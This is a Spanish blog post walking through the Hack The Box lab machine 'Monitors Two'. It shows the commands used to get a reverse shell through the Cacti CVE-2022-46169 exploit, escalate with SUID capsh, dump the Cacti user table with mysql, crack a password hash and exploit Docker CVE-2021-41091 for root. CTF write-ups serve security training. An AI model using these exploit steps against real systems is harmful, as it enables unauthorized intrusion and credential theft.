---
#obsidian
banner: "/resources/banners/arknights.png"
banner_y: 0.29429
banner_icon: 📝
#blog
layout: post
title: MONITORS TWO WRITEUP.
subtitle: Resolucion de la maquina monitors two de HTB.
header-img: img/in-post/monitors_two/monitors-two.webp
header-style: image
header-mask: rgba(0, 0, 0, .4)
catalog: true
tags:
  - htb
  - docker-abuse
  - rce
  - password-cracking

---

  <!-- HTML Meta Tags -->
  <title>MONITORS TWO WRITEUP.</title>
  <meta name="description" content="Resolución de la máquina monitors two de HTB.">
  <meta property="og:site_name" content="QuantumWavves">
  <meta property="og:image" content="https://quantumwavves.github.io/img/in-post/monitors_two/monitors-two.webp">

  <!-- Facebook Meta Tags -->
  <meta property="og:url" content="https://quantumwavves.github.io/2023/09/21/monitors-two/">
  <meta property="og:type" content="website">
  <meta property="og:title" content="MONITORS TWO WRITEUP.">
  <meta property="og:description" content="Resolución de la máquina monitors two de HTB.">
  <meta property="og:image" content="https://quantumwavves.github.io/img/in-post/monitors_two/monitors-two.webp">
  <meta property="og:image:width" content="200" />
  <meta property="og:image:height" content="200" />

  <!-- Twitter Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta property="twitter:domain" content="quantumwavves.github.io">
  <meta property="twitter:url" content="https://quantumwavves.github.io/2023/09/21/monitors-two/">
  <meta name="twitter:title" content="MONITORS TWO WRITEUP.">
  <meta name="twitter:description" content="Resolución de la máquina monitors two de HTB.">
  <meta name="twitter:image" content="https://quantumwavves.github.io/img/in-post/monitors_two/monitors-two.webp">

## Tools
- Python
- Netcat 
- John The Ripper
## Topics
- Remote Code Execution / Reverse Shell
- Docker
- CVE's 
- Privilege Escalation
- Password HASH cracking
- SSH

Hola, el dia de hoy vamos a resolver la maquina de monitors two de HTB.

Primero realizaremos un escaneo de reconocimiento con NMAP.

## Reconocimiento

```bash
sudo nmap -Pn -p- -A -T4 -oN scan.txt 10.10.11.211
```
Obtenemos el resultado del escaneo:

![nmap-scan](/img/in-post/monitors_two/nmap-scan.png)

Observamos que existen dos puertos abiertos, el 22 que corresponde al servicio de SSH y el 80 que corresponde al servicio de HTTP. Revisamos el puerto 80 a través del navegador.

![cacti-login](/img/in-post/monitors_two/cacti-login.png)

Observamos que es un login de Cacti, un software para el monitoreo de red. Probamos contraseñas  que estan por defecto sin tener exito. Sin embargo podemos buscar CVE para la versión 1.2.22 de cacti, misma que nos muestra en el login.

## RCE / Reverse Shell

Después de una búsqueda encontramos una CVE para la versión 1.2.22.

- [CVE 2022-46169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=VE-2022-46169)

Buscando encontre el siguiente script que nos ayuda con la RCE y nos brinda una reverse shell.

-  [FredBrave CVE-2022-46169](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

Utilizare Netcat con los siguientes flags -n para que no haga resolucion de dns, -l para estar a la escucha, -v de verbose y -p que indica el puerto, en este caso 443:

```bash
sudo nc -nlvp 443
```

Utilizando el script para la RCE podremos obtener la reverse shell.

```bash
python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST 10.10.16.79 --LPORT=443
```

![python-script](/img/in-post/monitors_two/python-script.png)

Ahora obtenemos la reverse shell a través del puerto 443.

![reverse-shell](/img/in-post/monitors_two/reverse-shell.png)

## Escalada de privilegios

Utilizaremos esta herramienta para enumerar los binarios SUID.

- [LinEnum](https://github.com/rebootuser/LinEnum)

Crearemos un servidor web para poder acceder al recurso.

![webserver](/img/in-post/monitors_two/python-webserver.png)

Obtenemos el recurso con wget.

![wget-source](/img/in-post/monitors_two/wget-source.png)

Le damos permisos de ejecucion.

```bash
chmod +x LinEnum.sh
  ```

![LinEnum-Permission](/img/in-post/monitors_two/linenum-permission.png)

Una vez ejecutado el script nos listara los archivos SUID, nos interesa el archivo ``/sbin/capsh``. ¿Por que nos interesa este archivo? Principalmente por que no pierde privilegios heredados, por que lo que puede funcionar nos como puerta trasera. Mas sobre este archivo:

- [gtfobins](https://gtfobins.github.io/gtfobins/capsh/)

![suid-enum](/img/in-post/monitors_two/suid-files.png)

Nos dirigimos a la ruta ``/sbin`` donde se encuentra el archivo capsh y ejecutaremos el siguiente comando para poder escalar privilegios.

```bash
./capsh --gid=0 --uid=0 --
```

![capsh](/img/in-post/monitors_two/capsh.png)

## Obteniendo credenciales

Observamos que mysql esta dentro del contenedor, utilizamos el siguiente comando para listar a los usuarios root.

```bash
mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
```

<img src="/img/in-post/monitors_two/mysql.png" onclick="window.open(this.src)">

Vemos que existe un usuario ``marcus`` y nos da un hash del password del usuario.

## Cracking Hash Password

Utilizaremos john the ripper para encontrar una coincidencia con un diccionario.

![john](/img/in-post/monitors_two/john.png)

Vemos que ha encontrado una posible coincidencia.

## Logeandose por ssh

Intentaremos acceder por ssh introduciendo las credenciales del usuario marcus.

![ssh-auth](/img/in-post/monitors_two/ssh-auth.png)

Y listo, tenemos acceso desde el usuario ``marcus``.

![login](/img/in-post/monitors_two/ssh-login.png)

## Escalando privilegios

Listaremos la version de docker que se esta utilizando.

![docker-v](/img/in-post/monitors_two/docker-v.png)

Vemos que es la version ``20.10.5+dfsg1``, buscaremos alguna CVE que pueda ayudarnos con la escalada de privilegios. Después de una busqueda encontre un script que nos ayuda con esta CVE.

- [Mitre CVE 2021-41091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-41091)
- [CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091)

Para poder usar este script necesitamos volver al contenedor y asignar a /bin/bash permisos de suid.

![bash](/img/in-post/monitors_two/bash-u+s.png)

Exponemos el recurso con un servidor web como lo hicimos anteriormente.

![wget-exp](/img/in-post/monitors_two/wget-exp.png)

Le damos permisos de ejecucion para poder utilizarlo. 

![exp=permission](/img/in-post/monitors_two/exp-permission.png)

Despues de la ejecucion vemos que nos arroja un path: <br> ``/var/lib/docker/overlay2/c41d5854e4bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged``.

![exp-exe](/img/in-post/monitors_two/exp-exe.png)

Nos dirigimos a ese directorio y ejecutamos el siguiente comando para obtener la shell en root.

```bash
./bin/bash -p
```

![powned](/img/in-post/monitors_two/powned.png)

Y listo, ahora somos root.

![furina](https://media.tenor.com/oY3PFmGbo98AAAAC/furina-genshin.gif)

Eso ha sido todo por el post, si piensas que me he equivocado en la informacion o en que he omitido algo que pueda mejorar el post, puedes contactarme por discord ```quantumwavves```
